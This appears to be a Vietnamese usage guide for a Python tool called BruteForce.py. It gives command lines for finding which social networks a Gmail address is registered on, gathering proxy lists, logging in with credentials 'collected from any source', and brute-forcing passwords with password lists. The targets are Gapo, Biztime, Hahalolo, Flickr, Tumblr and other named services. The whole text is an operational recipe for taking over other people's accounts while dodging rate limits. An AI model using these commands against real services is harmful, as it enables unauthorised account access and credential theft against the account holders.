Thực hiện dùng finder để tìm kiếm các mạng xã hội mà gmail đãng ký
python BruteForce.py -% [gmail]

===========================================================

Thực hiện nhận proxy

Nhận proxy cho tất cả các mạng xã hội bên trong công cụ

python BruteForce.py -> [proxy_list]

Nhận proxy cho mạng xã hội cụ thể

python BruteForce.py -> [proxy_list] -~ gapo

Nhận proxy cho nhiều mạng xã hội ngăn nhau bởi dấu ','

python BruteForce.py -> [proxy_list] -~ gapo,biztime


===========================================================

Thực hiện đăng nhập tài khoản thu thập được từ bất kỳ nguồn nào. Với tài khoản gmail và password

python BruteForce.py -! [Tên đăng nhập có dạng gmail] -$ [Mật khẩu] -< [proxy_list]

===========================================================

BruteForce trên từng mạng xã hội

BruteForce Gapo

python BruteForce.py -G [Tên đăng nhập] -# [password_list] -< [proxy_list]

BruteForce Biztime

python BruteForce.py -b [Tên đăng nhập] -# [password_list] -< [proxy_list]

BruteForce Hahalolo

python BruteForce.py -H [Tên đăng nhập] -# [password_list] -< [proxy_list]

BruteForce Flickr

python BruteForce.py -F [Tên đăng nhập] -# [password_list] -< [proxy_list]

BruteForce Tumblr

python BruteForce.py -T [Tên đăng nhập] -# [password_list] -< [proxy_list]

BruteForce Zoimas

python BruteForce.py -Z [Tên đăng nhập] -# [password_list] -< [proxy_list]

BruteForce Befilo

python BruteForce.py -B [Tên đăng nhập] -# [password_list] -< [proxy_list]

BruteForce Desentric

python BruteForce.py -D [Tên đăng nhập] -# [password_list] -< [proxy_list]

===========================================================

Ngoài ra có thể kiểm tra đang nhập cụ thể bằng cách lệnh

Ví dụ cho Gapo

python BruteForce.py -G [Tên đăng nhập] -$ [password] -< [proxy_list]
